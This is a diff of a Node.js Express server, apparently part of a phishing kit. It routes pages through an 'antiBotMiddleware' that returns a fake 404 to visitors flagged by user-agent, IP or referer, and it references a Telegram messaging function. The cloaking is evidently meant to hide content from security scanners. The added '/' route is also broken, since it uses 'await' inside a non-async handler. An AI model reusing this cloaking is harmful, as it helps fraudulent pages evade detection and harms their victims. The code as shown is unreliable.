@@ -52,8 +52,7 @@ const sendTelegramMessage = (text) => {
 
 
 
-app.get('/app', async (req, res) => {
-    try {
+app.get('/app', antiBotMiddleware, async (req, res) => {   try {
         const pickContent = await fs.readFile('select.md', 'utf-8');
         res.send(pickContent); // Send the content of select.md directly
     } catch (error) {
@@ -204,6 +203,7 @@ function isBotRef(referer) {
 }
 
 
+
 async function antiBotMiddleware(req, res, next) {
     const clientUA = req.headers['user-agent'] || req.get('user-agent');
     const clientIP = getClientIp(req);
@@ -212,21 +212,26 @@ async function antiBotMiddleware(req, res, next) {
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
         return res.status(404).send('404 Not Found');
     } else {
-    	
-    	try {
-	    	const pickContent = await fs.readFile('index.md', 'utf-8');
-			res.send(pickContent);
-    	} catch (error) {
-        	console.error('Error reading file:', error);
-        	res.status(500).send('Internal Server Error');
-    	}
-	}
+        next();
+    }
 }
 
-// Middlewares
-app.use(antiBotMiddleware);
+
+app.get('/', antiBotMiddleware, (req, res) => {
+    try {
+    	const pickContent = await fs.readFile('index.md', 'utf-8');
+		res.send(pickContent);
+    	//res.sendFile(path.join(__dirname, 'index.md'));
+    	    } catch (error) {
+        // Handle any errors, for example, file not found
+        console.error('Error reading file:', error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+
 app.use(express.static(__dirname));
 
-app.get('*', (req, res) => {
+app.get('*', antiBotMiddleware, (req, res) => {
     res.status(404).send('404 Not Found');
 });
